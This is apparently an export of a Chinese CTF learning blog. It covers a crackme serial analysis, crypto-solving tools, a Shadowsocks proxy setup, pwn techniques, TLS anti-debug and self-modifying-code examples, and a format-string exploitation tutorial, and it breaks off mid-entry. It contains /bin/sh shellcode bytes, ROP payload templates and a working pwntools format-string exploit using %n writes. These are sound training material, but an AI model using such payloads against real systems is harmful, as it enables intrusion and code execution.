[ecx+0x2]011518BC 40 inc eax011518BD 83F8 7A cmp eax, 0x7A011518C0 ^ 7E F4 jle short 011518B6 ; a-z011518C2 33D2 xor edx, edx011518C4 8D45 B0 lea eax, dword ptr [ebp-0x50]011518C7 66:3955 B0 cmp word ptr [ebp-0x50], dx011518CB 74 0D je short 011518DA011518CD 0F1F ??? ; 未知命令011518CF 008D 40024266 add byte ptr [ebp+0x66420240], cl011518D5 8338 00 cmp dword ptr [eax], 0x0011518D8 ^ 75 F6 jnz short 011518D0011518DA 33C9 xor ecx, ecx011518DC 85D2 test edx, edx011518DE 74 1C je short 011518FC011518E0 0FB7444D B0 movzx eax, word ptr [ebp+ecx*2-0x50]011518E5 83F8 61 cmp eax, 0x61011518E8 72 0D jb short 011518F7011518EA 83F8 7A cmp eax, 0x7A011518ED 77 08 ja short 011518F7011518EF 83C0 E0 add eax, -0x20011518F2 66:89444D B0 mov word ptr [ebp+ecx*2-0x50], ax011518F7 41 inc ecx011518F8 3BCA cmp ecx, edx011518FA ^ 72 E4 jb short 011518E0011518FC 33C9 xor ecx, ecx011518FE 8BC7 mov eax, edi01151900 85FF test edi, edi01151902 74 76 je short 0115197A01151904 66:390F cmp word ptr [edi], cx01151907 74 11 je short 0115191A01151909 0F1F ??? ; 未知命令0115190B 8000 00 add byte ptr [eax], 0x00115190E 0000 add byte ptr [eax], al01151910 8D40 02 lea eax, dword ptr [eax+0x2]01151913 41 inc ecx01151914 66:8338 00 cmp word ptr [eax], 0x001151918 ^ 75 F6 jnz short 011519100115191A 33C0 xor eax, eax0115191C 85C9 test ecx, ecx0115191E 74 22 je short 0115194201151920 83F8 02 cmp eax, 0x201151923 73 07 jnb short 0115192C01151925 66:833447 0F xor word ptr [edi+eax*2], 0xF0115192A EB 11 jmp short 0115193D0115192C 83F8 04 cmp eax, 0x40115192F 73 07 jnb short 0115193801151931 66:833447 50 xor word ptr [edi+eax*2], 0x5001151936 EB 05 jmp short 0115193D01151938 66:833447 42 xor word ptr [edi+eax*2], 0x420115193D 40 inc eax0115193E 3BC1 cmp eax, ecx01151940 ^ 72 DE jb short 0115192001151942 33D2 xor edx, edx01151944 8BC7 mov eax, edi01151946 66:3917 cmp word ptr [edi], dx01151949 74 0F je short 0115195A0115194B 0F1F ??? ; 未知命令0115194D 44 inc esp0115194E 0000 add byte ptr [eax], al01151950 8D40 02 lea eax, dword ptr [eax+0x2]01151953 42 inc edx01151954 66:8338 00 cmp word ptr [eax], 0x001151958 ^ 75 F6 jnz short 011519500115195A 33C9 xor ecx, ecx0115195C 85D2 test edx, edx0115195E 74 1A je short 0115197A01151960 0FB7044F movzx eax, word ptr [edi+ecx*2]01151964 83F8 61 cmp eax, 0x6101151967 72 0C jb short 0115197501151969 83F8 7A cmp eax, 0x7A0115196C 77 07 ja short 011519750115196E 83C0 E0 add eax, -0x2001151971 66:89044F mov word ptr [edi+ecx*2], ax01151975 41 inc ecx01151976 3BCA cmp ecx, edx01151978 ^ 72 E6 jb short 011519600115197A 33F6 xor esi, esi0115197C 0F57C0 xorps xmm0, xmm00115197F 66:0FD6 ??? ; 未知命令01151982 45 inc ebp01151983 F0:66:8975 F8 lock mov word ptr [ebp-0x8], si ; 不允许锁定前缀01151988 66:3937 cmp word ptr [edi], si0115198B 74 48 je short 011519D50115198D 66:8B4D B0 mov cx, word ptr [ebp-0x50]01151991 8D5D F0 lea ebx, dword ptr [ebp-0x10]01151994 8BC7 mov eax, edi01151996 66:85C9 test cx, cx01151999 74 2C je short 011519C70115199B 0FB710 movzx edx, word ptr [eax]0115199E 8D4D B0 lea ecx, dword ptr [ebp-0x50]011519A1 33C0 xor eax, eax011519A3 66:3B11 cmp dx, word ptr [ecx]011519A6 74 10 je short 011519B8011519A8 40 inc eax011519A9 8D4D B0 lea ecx, dword ptr [ebp-0x50]011519AC 66:833C41 00 cmp word ptr [ecx+eax*2], 0x0011519B1 8D0C41 lea ecx, dword ptr [ecx+eax*2]011519B4 ^ 75 ED jnz short 011519A3011519B6 EB 0B jmp short 011519C3011519B8 66:8B4445 B0 mov ax, word ptr [ebp+eax*2-0x50]011519BD 66:8903 mov word ptr [ebx], ax011519C0 83C3 02 add ebx, 0x2011519C3 66:8B4D B0 mov cx, word ptr [ebp-0x50]011519C7 46 inc esi011519C8 66:833C77 00 cmp word ptr [edi+esi*2], 0x0011519CD 8D0477 lea eax, dword ptr [edi+esi*2]011519D0 ^ 75 C4 jnz short 01151996011519D2 8B5D AC mov ebx, dword ptr [ebp-0x54]011519D5 33C9 xor ecx, ecx011519D7 8D45 F0 lea eax, dword ptr [ebp-0x10]011519DA 66:394D F0 cmp word ptr [ebp-0x10], cx011519DE 74 59 je short 01151A39011519E0 8D40 02 lea eax, dword ptr [eax+0x2]011519E3 41 inc ecx011519E4 66:8338 00 cmp word ptr [eax], 0x0011519E8 ^ 75 F6 jnz short 011519E0011519EA 83F9 02 cmp ecx, 0x2011519ED 75 4A jnz short 01151A39011519EF 33C0 xor eax, eax011519F1 C745 F0 3100350&gt;mov dword ptr [ebp-0x10], 0x350031011519F8 C745 F4 5000420&gt;mov dword ptr [ebp-0xC], 0x420050011519FF 8D77 04 lea esi, dword ptr [edi+0x4]01151A02 66:8945 F8 mov word ptr [ebp-0x8], ax01151A06 33C9 xor ecx, ecx01151A08 0F1F ??? ; 未知命令01151A0A 8400 test byte ptr [eax], al01151A0C 0000 add byte ptr [eax], al01151A0E 0000 add byte ptr [eax], al01151A10 66:8B444D F0 mov ax, word ptr [ebp+ecx*2-0x10]01151A15 66:3B06 cmp ax, word ptr [esi]01151A18 75 1F jnz short 01151A3901151A1A 41 inc ecx01151A1B 83C6 02 add esi, 0x201151A1E 83F9 04 cmp ecx, 0x401151A21 ^ 72 ED jb short 01151A1001151A23 8BD7 mov edx, edi01151A25 8BCB mov ecx, ebx01151A27 E8 14FDFFFF call 01151740 ; 这里是最后判断的call，01151A2C 6A 00 push 0x001151A2E 85C0 test eax, eax01151A30 74 09 je short 01151A3B01151A32 68 0B040000 push 0x40B01151A37 EB 07 jmp short 01151A4001151A39 6A 00 push 0x001151A3B 68 0A040000 push 0x40A01151A40 68 11010000 push 0x11101151A45 FF73 04 push dword ptr [ebx+0x4]01151A48 FF15 54811601 call dword ptr [&lt;&amp;USER32.PostMessageW&gt;; user32.PostMessageW 以上代码比如初始化0-9,a-z，注册码转换成大写，提取出注册码里所有的字母，纯属多余接下去直接看里面最后的call123456789101112131415161718192021222301151810 &gt; /66:8B01 mov ax, word ptr [ecx]01151813 . |66:3B040E cmp ax, word ptr [esi+ecx] ; 判断第1,2位是否为&apos;12&apos;01151817 . |75 42 jnz short 0115185B01151819 . |83C2 06 add edx, 0x60115181C . |83C1 02 add ecx, 0x20115181F . |83FA 39 cmp edx, 0x3901151822 .^\7E EC jle short 0115181001151824 . 0FB74F 12 movzx ecx, word ptr [edi+0x12] ； 第i位字符+第1位字符是否为0x63（设计不合理?）01151828 . 0FB703 movzx eax, word ptr [ebx]0115182B . 03C8 add ecx, eax0115182D . 83F9 63 cmp ecx, 0x6301151830 . 75 29 jnz short 0115185B01151832 . 8B45 B4 mov eax, dword ptr [ebp-0x4C]01151835 . 0FB74F 0C movzx ecx, word ptr [edi+0xC]01151839 . 0308 add ecx, dword ptr [eax]0115183B . 8B45 B0 mov eax, dword ptr [ebp-0x50]0115183E . 0FB700 movzx eax, word ptr [eax]01151841 . 3BC1 cmp eax, ecx01151843 . 75 16 jnz short 0115185B ; 这里判断注册码最后一位是否等于用&apos;123456789&apos;替换了注册码的n位之后的字符判断的第0x0c位+n是否相等01151845 . 5F pop edi01151846 . 5E pop esi01151847 . B8 01000000 mov eax, 0x10115184C . 5B pop ebx 以上分析完成得到一组注册码1215pb81）包含字符’b’’’p’2) 7位长度3) 第1、2位为’1’’2’4） 第0位字符’1’(0x30)+第n位字符(计数所在位)’2’(0x32) = 0x635) 第3、4、5、6位为’15pb’6) 最后1位为‘7’+计数]]></content>
      <categories>
        <category>re</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[CTF中的解密]]></title>
    <url>%2F2017%2F10%2F23%2Fmisc_mima%2F</url>
    <content type="text"><![CDATA[ctf必备解密网站 1、密码维吉尼亚https://www.guballa.de/vigenere-solverbrainfuck密码https://www.nayuki.io/page/brainfuck-interpreter-javascript字符串转16进制http://www.3464.com/tools/StrToHex/进制转换(这里如果这个数太大，这里可以解决)https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=baidu&amp;wd=10%E8%BD%AC%E6%8D%A2%E6%88%90%E4%BA%8C%E8%BF%9B%E5%88%B6&amp;oq=10%25E8%25BD%25AC%25E6%258D%25A216&amp;rsv_pq=b2aaa4a900006164&amp;rsv_t=c585GpBLAmvpieM48PKR9QDP%2BJpsW3F14XD8RRkUVGrt%2BgnKSqffNWd8R4s&amp;rqlang=cn&amp;rsv_enter=1&amp;rsv_sug3=1&amp;rsv_sug1=1&amp;rsv_sug7=100&amp;bs=10%E8%BD%AC%E6%8D%A216md5http://www.dmd5.com/生成二维码http://tool.chinaz.com/qrcode词频分析http://www.aihanyu.org/cncorpus/CpsTongji.aspxhttps://quipqiup.com/libc库查询http://libcdb.com/栅栏密码http://www.qqxiuzi.cn/bianma/zhalanmima.php解密代码123456789101112131415char s[]= "tn c0afsiwal kes,hwit1r g,npt ttessfu&#125;ua u hmqik e &#123;m, n huiouosarwCniibecesnren."; char t[86]= ""; int i,j,k;k=0;for (i=0;i&lt;17;i++) &#123; for(j=0;j&lt;5;j++) &#123; t[k++]= ch[j*17+i]; &#125; &#125; for(i=0;i&lt;85;i++)&#123; printf("%c",t[i]);&#125; 当铺密码王夫 井工 夫口 由中人 井中 夫夫 由中大：67 84 70 123 82 77 125凯撒密码12345678910111213141516#!/usr/bin/env python # -*- coding: utf-8 -*-__author__ = 'ByStudent'lstr="""U8Y]:8KdJHTXRI&gt;XU#?!K_ecJH]kJG*bRH7YJH7YSH]*=93dVZ3^S8*$:8"&amp;:9U]RH;g=8Y!U92'=j*$KH]ZSj&amp;[S#!gU#*dK9\."""for p in range(127): str1 = '' for i in lstr: temp = chr((ord(i)+p)%127) if 32&lt;ord(temp)&lt;127 : str1 = str1 + temp feel = 1 else: feel = 0 break if feel == 1: print(str1) 莫斯密码http://www.jb51.net/tools/morse.htm希尔密码密文： 22,09,00,12,03,01,10,03,04,08,01,17 （明文：wjamdbkdeibr）解题思路：使用的矩阵是 1 2 3 4 5 6 7 8 10123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#!/usr/bin/env python# -*- coding: utf-8 -*-__Url__ = &apos;Http://www.purpleroc.com&apos;__author__ = &apos;Tracy_梓朋&apos;from numpy import *Dic = &#123;chr(i+97):i for i in range(26)&#125;def decode(pwd, org): temp = [] result = [] while True: if len(pwd) % 3 != 0: pwd.append(pwd[-1]) else: break for i in pwd: temp.append(Dic.get(i)) temp = array(temp) temp = temp.reshape(len(pwd)/3, 3) #print temp #print org xx = matrix(temp)*org for j in range(len(pwd)/3): for i in range(3): if (int(xx[j, i]) &gt;= 26): result.append(chr(xx[j, i] % 26 + 97)) #print xx[j, i] % 26 else: #print xx[j, i] result.append(chr(xx[j, i] + 97)) return resultdef get_vmatrix(org): org_adjoin = org.I*linalg.det(org) print org_adjoin org_det = int(str(abs(linalg.det(org))).split(&apos;.&apos;)[0]) print org_det for i in range(1, 26): if i * org_det % 26 == 1: break org_mod = -org_adjoin * i % 26 org_mod = matrix(org_mod) temp = [] for i in range(org_mod.shape[0]): for j in range(org_mod.shape[1]): temp.append(int(str(org_mod[i, j]).split(&apos;.&apos;)[0])) org_final = matrix(temp).reshape(org_mod.shape[0], org_mod.shape[1]) #print org_final return org_finalif __name__ == &apos;__main__&apos;: &apos;&apos;&apos; for test pwd = list(&quot;act&quot;) org = matrix(array([[6, 24, 1], [13 , 16, 10], [20, 17, 15]])) result = decode(pwd, org) print &quot;&quot;.join(result) deorg = matrix(array([[8, 5, 10], [21 , 8, 21], [21, 12, 8]])) result = decode(result, deorg) print &quot;&quot;.join(result) &apos;&apos;&apos; pwd = &quot;wjamdbkdeibr&quot; pwd = list(pwd) org = matrix(array([[1,2,3],[4,5,6],[7,8,10]])) org_vm = get_vmatrix(org) print org_vm print &quot;Your flag is :&quot; + &quot;&quot;.join(decode(pwd, org_vm)) unicode编码，时间戳http://tool.chinaz.com/Tools/Unicode.aspx 手机密码(最后一位不能超过4,85(错))键盘密码（123–x,y） RSA加密过程123456789找到两个大素数p和q，计算出n=p×q得到φ=(p−1)×(q−1)，然后选择一个e(1大于e小于φ)，且gcd(φ,e)=1，gcd为最大公约数，即e和φ互质(互为质数)计算出d，计算方法:(e×d)%φ=1得到了公私钥对，其中&#123;e,n&#125;为公钥，&#123;d,n&#125;为私钥。针对明文M，进行加密：C=Me%n，得到的C即为密文针对密文C，进行解密，M=Cd%n，得到的M即为明文 攻击方法1、直接分解n(前提是n比较小)2、共模攻击，N相同3、低加密指数攻击4、低加密指数广播攻击:这个识别起来比较简单，加密指数较低，并且使用了相同的加密指数给一个接受者的群发送相同的信息，那么可以进行广播攻击得到明文。]]></content>
      <categories>
        <category>misc</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[vps-翻墙访问Google浏览器]]></title>
    <url>%2F2017%2F10%2F22%2Fmisc_vpn%2F</url>
    <content type="text"><![CDATA[穿越万里长城只为你——Google,hexo的颜值和正义 vpn1、为何翻墙因为我们这个地方世界太小，需求太多，寻找学习资源 2、准备工具这里是下面需要用到的工具链接：http://pan.baidu.com/s/1o8JYSps 密码：03lo 3、开始1、购买一台服务器(vps)作为跳板，可以访问国外站(ping www.google.com),这里可以买:https://www.vultr.com/买好以后如下:第一个箭头可以查看用户名和密码，第二个可以远程连接国外服务器(这里也可以用PuTTY连接，上面工具里有)2、准备翻墙客户端——Shadowsocks.exe工具开启已经给出，运行exe程序即可使用https://www.landiannews.com/archives/20932.html3、准备chrome的插件SwitchyOmega这里有个链接:https://jingyan.baidu.com/article/11c17a2c121c0ff446e39d16.html 换个姿势理解这里有个链接：https://www.diycode.cc/topics/738 这里前面弄了好久，然而没有用,下面是我用的方式克隆（不知道为什么没有克隆下来）git clone https://github.com/clowwindy/shadowsocks-libev.git下载wget https://github.com/clowwindy/shadowsocks-libev/archive/master.zip解压unzip master.zip运行1234567sudo apt-get updatesudo apt-get install shadowsockscd shadowsocks-libevsudo apt-get install build-essential autoconf libtool libssl-dev gawk debhelpersudo dpkg-buildpackagecd ..sudo dpkg -i shadowsocks*.deb 编辑配置sudo vim /etc/shadowsocks/config.json12345678&#123; &quot;server&quot;:&quot;45.63.17.127&quot;, &quot;server_port&quot;:8989, &quot;local_port&quot;:1080, &quot;password&quot;:&quot;lala&quot;, &quot;timeout&quot;:300, &quot;method&quot;:&quot;aes-256-cfb&quot;&#125; 查看进程netstat -pantu 启动服务ss-server -c /etc/shadowsocks/config.json成功 改为后台运行nohup ss-server -c /etc/shadowsocks/config.json &amp; 本机配置，运行exe浏览器chrome插件 4、测试 hexo安装与配置1、安装http://blog.betamao.me/2017/08/24/COS%E5%8A%A0CDN%E9%83%A8%E7%BD%B2HEXO/#more 2、换主题http://blog.csdn.net/qq_33699981/article/details/72716951 3、评论https://ioliu.cn/2017/add-valine-comments-to-your-blog/]]></content>
      <categories>
        <category>misc</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PWN从开始到开始--pwn题的一些小技巧]]></title>
    <url>%2F2017%2F10%2F14%2Fpwn_tools%2F</url>
    <content type="text"><![CDATA[pwn题必备的套路 技巧工具首先安装pwntoolsgit clone https://github.com/Gallopsled/pwntoolscd pwntoolspython setup.py install安装pedagit clone https://github.com/longld/peda.git ~/pedaecho &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit编译x86程序依赖12sudo apt-get install build-essential module-assistant sudo apt-get install gcc-multilib g++-multilib 生成x86文件gcc -m32 -no-pie -fno-stack-protector -z execstack -o stack1 stack1.c-no-pie会关掉PIE,-fno-stack-protector和-z execstack这两个参数会分别关掉Stack Protector和NX 找到返回地址x86-如下gdb ./pwn‘a’*112+addr_ret或者12pattern create 200pattern search 0x4141313d 或者123ipythoncyclic(200)cyclic_find('aapa') x64 生成shellcode这个联网才可以结果如下例子(shellcode):12shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" 找内存中函数地址这需要程序跑完,在gdb里p systemp callsystem查看内存x \16x 0x482054x \gx rsp 搭建pwn题目查看是否开启随机化(不是0则开启)cat /proc/sys/kernel/randomize_va_space关闭随机化echo 0 &gt; /proc/sys/kernel/randomize_va_space搭建题目socat tcp-l:4000,fork exec:./pwn连接测试nc 127.0.0.1 4000 coredump在/etc/profile中加入以下一行，这将允许生成coredump文件ulimit -c unlimited在rc.local中加入以下一行，这将使程序崩溃时生成的coredump文件位于/tmp目录下echo /tmp/core.%e.%p &gt; /proc/sys/kernel/core_pattern调试coredump文件gdb ./test test.corex64找到溢出地点x \100x $esp-100 libc查询(然而我并没有查到)http://libcdb.com/ 查找到gadgetobjdump -d babypwn4 | egrep &quot;ret|pop&quot; read和write1234567891011read(int 0, void *buf, size_t count);#使用 read( 0, *buf, count);&apos;a&apos;*140+p32(read_plt)+p32(ret)+p32(0)+p32(address)+p32(4)----------------------------------------------------------write(int 1, const void *buf, size_t nbyte);#使用 write( 1, *buf, nbyte);&apos;a&apos;*140+p32(write_plt)+p32(ret)+p32(1)+p32(address)+p32(4) ELF123elf = ELF(&apos;./pwn&apos;)gets_plt = symbols[&apos;gets&apos;]buf = elf.bss() gdb断点12gdb.attach(p,&quot;break *0x8048884&quot;) #断在某一处，因为是断在内核中，需要按几次c，就可以断到0x8048884的地方啦gdb.attach(p) #不好说，一般断在输入函数结束的地方 学不完的套路程序段123./le1 &amp;pidof le1cat /proc/1705(pid)/maps gdb里面的返向跑recored程序流程ltrace ./le1看调用了那些函数strace ./le1制作 call syscall和shellcode123456ipythonfrom pwn import *print shellcraft.sh()print shellcraft.syscall(0,1,2)asm('mov eax,11') 这里的\x00\x00\x00坏字符1234asm(&apos;&apos;&apos;xor eax,eaxmov al,11&apos;&apos;&apos;) lay asm linux下shellcode的编写1、在shellcode中不能出现/x00也就是NULL字符，当出现NULL字符的时候将会导致shellcode被截断，从而无法完成其应有的功能2、有一个int $0x80来执行系统调用 程序12345678910#include&lt;stdio.h&gt;#include&lt;unistd.h&gt;int main ( int argc, char * argv[] )&#123; char * name[2]; name[0] = "/bin/ksh"; name[1] = NULL; execve( name[0], name, NULL ); return 0;&#125; 编译1gcc -m32 -no-pie -fno-stack-protector -z execstack -o shellcd shellcd.c gdb加载123456789101112131415161718192021222324252627282930313233$gdb shellcgdb-peda$ disassemble mainDump of assembler code for function main: 0x08048406 &lt;+0&gt;: lea ecx,[esp+0x4] 0x0804840a &lt;+4&gt;: and esp,0xfffffff0 0x0804840d &lt;+7&gt;: push DWORD PTR [ecx-0x4] 0x08048410 &lt;+10&gt;: push ebp 0x08048411 &lt;+11&gt;: mov ebp,esp 0x08048413 &lt;+13&gt;: push ebx 0x08048414 &lt;+14&gt;: push ecx 0x08048415 &lt;+15&gt;: sub esp,0x10 0x08048418 &lt;+18&gt;: call 0x8048458 &lt;__x86.get_pc_thunk.ax&gt; 0x0804841d &lt;+23&gt;: add eax,0x1be3 0x08048422 &lt;+28&gt;: lea edx,[eax-0x1b20] 0x08048428 &lt;+34&gt;: mov DWORD PTR [ebp-0x10],edx 0x0804842b &lt;+37&gt;: mov DWORD PTR [ebp-0xc],0x0 0x08048432 &lt;+44&gt;: mov edx,DWORD PTR [ebp-0x10] 0x08048435 &lt;+47&gt;: sub esp,0x4 0x08048438 &lt;+50&gt;: push 0x0 0x0804843a &lt;+52&gt;: lea ecx,[ebp-0x10] 0x0804843d &lt;+55&gt;: push ecx 0x0804843e &lt;+56&gt;: push edx 0x0804843f &lt;+57&gt;: mov ebx,eax 0x08048441 &lt;+59&gt;: call 0x80482f0 &lt;execve@plt&gt; 0x08048446 &lt;+64&gt;: add esp,0x10 0x08048449 &lt;+67&gt;: mov eax,0x0 0x0804844e &lt;+72&gt;: lea esp,[ebp-0x8] 0x08048451 &lt;+75&gt;: pop ecx 0x08048452 &lt;+76&gt;: pop ebx 0x08048453 &lt;+77&gt;: pop ebp 0x08048454 &lt;+78&gt;: lea esp,[ecx-0x4] 0x08048457 &lt;+81&gt;: ret End of assembler dump. 研究 execve() 函数的执行过程研究 exit() 函数的执行过程文学修养无边落木萧萧下，不尽长江滚滚来。万里悲秋常作客，百年多病独登台。]]></content>
      <categories>
        <category>pwn</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[RE_绕过tls_与_SMC保护]]></title>
    <url>%2F2017%2F10%2F10%2Fre_tls%2F</url>
    <content type="text"><![CDATA[在main函数前，还有什么 TLS1、何为tlsTLS回调函数是指，每当创建/终止进程的线程时会自动调用执行的函数。创建的主线程也会自动调用回调函数，且其调用执行先于EP代码。 2、编写tls函数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#include &lt;windows.h&gt; #include&lt;stdio.h&gt;#include &lt;winnt.h&gt; #include &lt;stdlib.h&gt;#include &lt;tlhelp32.h&gt;//////////////////////////////////////////////////////////////////////////////////使用tls 回调函数//使用TLS 的宏#pragma comment(linker, "/INCLUDE:__tls_used")void lookupprocess()&#123; PROCESSENTRY32 pe32; pe32.dwSize = sizeof(pe32); HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // 在快照中包含系统中所有的进程 BOOL bMore = Process32First(hProcessSnap, &amp;pe32); // 获得第一个进程的句柄 while (bMore) &#123; _wcslwr_s(pe32.szExeFile, wcslen(pe32.szExeFile)+1); if (!wcscmp(pe32.szExeFile, L"ollyice.exe")) &#123; printf("///////WARNING///////\n"); exit(0); &#125; if (!wcscmp(pe32.szExeFile, L"ollydbg.exe")) &#123; printf("///////\nWARNING\n///////\n"); exit(0); &#125; if (!wcscmp(pe32.szExeFile, L"peid.exe")) &#123; printf("///////\nWARNING\n///////\n"); exit(0); &#125; if (!wcscmp(pe32.szExeFile, L"ida.exe")) &#123; printf("///////\nWARNING\n///////\n"); exit(0); &#125; if (!wcscmp(pe32.szExeFile, L"idaq.exe")) &#123; printf("///////\nWARNING\n///////\n"); exit(0); &#125; bMore = Process32Next(hProcessSnap, &amp;pe32); // 获取下一个进程的句柄 &#125; CloseHandle(hProcessSnap);&#125;void Debugger(void) &#123; int result = 0; __asm &#123; mov eax, dword ptr fs:[30h]//TEB偏移30H处 movzx eax, byte ptr ds:[eax + 2h]//取PEB中BeingDebug，若为1则被调试 mov result, eax &#125; if (result) &#123; printf("///////\nWARNING\n///////\n"); exit(0); &#125;&#125;void NTAPI tls_callback(PVOID h, DWORD reason, PVOID pv)&#123; lookupprocess(); Debugger(); MessageBox(NULL, L"Not_Main_this_is_tls!", L"tls", MB_OK); return;&#125;#pragma data_seg(".CRT$XLB")PIMAGE_TLS_CALLBACK p_thread_callback[] = &#123; tls_callback, 0 &#125;;#pragma data_seg()////////////////////////////////////////////////////////////////////////////////int main()&#123; MessageBox(NULL, L"Main!", L"ESE", MB_OK); return 0;&#125; 3、实践TLS callback函数的定义123456789101112typedef VOID(NTAPI *PIMAGE_TLS_CALLBACK) ( PVOID DllHandle, //模块句柄，即加载地址 DWORD Reason, PVOID Reserved );其中reason有以下几种：(winNT.h)#define DLL_PROCESS_ATTACH 1 进程启动#define DLL_THREAD_ATTACH 2 线程启动#define DLL_THREAD_DETACH 3 线程退出#define DLL_PROCESS_DETACH 0 进程退出 3、手动去除TLS函数例如：ida打开是这样的那就有TLS函数1、OD去除TLS函数OD运行，f9直接退出，因为会先执行TLS函数，这时需要设置成这样这就可以停在系统断点，可以看看tls函数做了什么，一般都是判断是否使用工具，ida,od，peid，如果有使用其中一种，程序直接退出，不会执行main函数接着就一步一步的找TLS函数，找到直接把tls函数nop。2、利用PEviewEXE和winhex去掉TLS函数利用PEviewEXE查看PE文件的结构体,发现TLS结构体修改1修改为修改2修改为将修改后的文件另存为111.exe,ida打开这是已经去掉TLS函数了，收工 SMCSMC是一种局部代码加密技术，通过对一段代码进行加密来达到增加逆向工程难度或者免杀的目的。SMC 技术是病毒常用的技巧。SMC不仅能使用汇编上实现，还能很容易的使用VC实现，但是有一个比较致命缺陷：要精准的定位某个函数非常麻烦，所以我们就要以区块为加密的基础单位。 预备知识需要一点点的PE结构基础就ok啦。加密需要一个加密函数，这里我用简单的xor函数123456789//加密函数void enc(char *start,int len)&#123; int i; for(i=0;i&lt;len;i++) //这里对地址进行简单的加密&gt; &#123; *(start+i) ^=0x88; &#125;&#125; 编写SMC所谓SMC（Self Modifying Code）技术,就是一种将可执行文件中的代码或数据进行加密，防止别人使用逆向工程工具（比如一些常见的反汇编工具）对程分序进行静态析的方法，只有程序运行时才对代码和数据进行解密，从而正常运行程序和访问数据。计算机病毒通常也会采用SMC技术动态修改内存中的可执行代码来达到变形或对代码加密的目的，从而躲过杀毒软件的查杀或者迷惑反病毒工作者对代码进行分析。因为定位一个具体的函数很繁琐，所以我们选择直接定位一个节表。把敏感的代码放入节表中，然后在需要的时候进行解密，这就是SMC动态加密技术的精髓。 如何把敏感代码放入一个节表中？1#pragma comment(linker, "/SECTION:.text,ERWS") 将这句话放在开始程序的开始(也就是include下面)，主要是让text节区可以执行(E)读(R)写(W)分享(S) 例子123456789101112131415161718192021222324252627282930#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#pragma comment(linker, "/SECTION:.text,ERWS")void enc(char *start,int len)&#123; int i; for(i=0;i&lt;len;i++) //这里对地址进行简单的加密&gt; &#123; *(start+i) ^=0x88; &#125;&#125;//需要保护的函数void ck()&#123; printf("this is a test of smc");&#125;//加密数据结束的地址void end()&#123;&#125;int main()&#123; char *lp_s = 0; char *lp_e = 0; int len=0; lp_s = (char *)ck; //获取需要加密函数的起始地址 lp_e = (char *)end; //获取需要加密函数的结束地址 len=lp_e-lp_s; enc(lp_s,len); //smc加密函数 ck();&#125; 现在，现在可以编译通过,生成test，但是无法运行，因为ck()函数的地址已经被打乱啦，这时候就利用OD进行修改，载入生成的程序，当程序运行enc()函数完成时，这时ck就已经完成加密啦，然后将程序dump下来test1。这时就可以运行啦。若拿test去静态看时，完全看不懂ck的代码(这就进行smc加密啦)。 解密SMC1、找到smc的加密函数，当运行完成smc解密函数时,将程序dump下来。2、smc对程序动态完全没有用，可以用OD来调试程序，找到受保护代码]]></content>
      <categories>
        <category>re</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PWN——格式化字符串利用]]></title>
    <url>%2F2017%2F10%2F09%2Fpwn3_me_fmt%2F</url>
    <content type="text"><![CDATA[FmtStr格式化字符串利用 格式化字符串初识格式化字符串函数:int printf(const char *format, [argument]);printf()函数的调用格式为: printf(“&lt;格式化字符串&gt;”, &lt;参量表&gt;)。 基本的格式化字符串参数%c：输出字符，配上%n可用于向指定地址写数据。%d：输出十进制整数，配上%n可用于向指定地址写数据。%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100x10$n (%100d10$n)表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。 源码123456789101112131415161718192021#include &lt;stdio.h&gt;int a = 123, b = 456;int main()&#123; int c = 789; char s[100]; printf("%p\n", &amp;c); scanf("%s", s); printf(s); //格式化，利用参数传递，打印出我们需要的地址if (c == 16) &#123; puts("modified c.");&#125;else if (a == 2) &#123; puts("modified a for a small number."); &#125; else if (b == 0x12345678) &#123; puts("modified b for a big number!"); &#125; return 0;&#125; 生成文件gcc -m32 -no-pie -fno-stack-protector -z execstack -o fmt fmt.c 分析ida调试,因为a，b都是全局变量，找到a,b的地址gdb调试确定输入的是第6个参数 exp123456789101112131415from pwn import *def ha(): p = process('./fmt') c_addr = int(p.recvuntil('\n'),16) a_addr = 0x804A024 b_addr = 0x804A028 print hex(c_addr) raw_input() payloadc = p32(c_addr)+'%12x'+'%6$n' payloada = 'aa'+'%8$n'+'aa'+p32(a_addr) payloadb= p32(b_addr)+p32(b_addr+1)+p32(b_addr+2)+p32(b_addr+3)+'%104x'+'%6$hhn'+'%222x'+'%7$hhn'+'%222x'+'%8$hhn'+'%222x'+'%9$hhn' p.sendline(payloadb) print p.recv() p.interactive()ha() 这个exp解释一下：%12x表示填充12个字节。特别payloada的时候，%8$n是字符输入的，所以占4个字节，所以地址是在第8个参数，但是输出不会打印出来，所以下面的构造payloadb时候，%x$n不算在字节。 格式化的利用程序链接：http://pan.baidu.com/s/1mil6uTE 密码：7ff0123456[*] '/root/ctf/pwn_learning/zjgsu/pwn3/pwn3' Arch: i386-32-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: 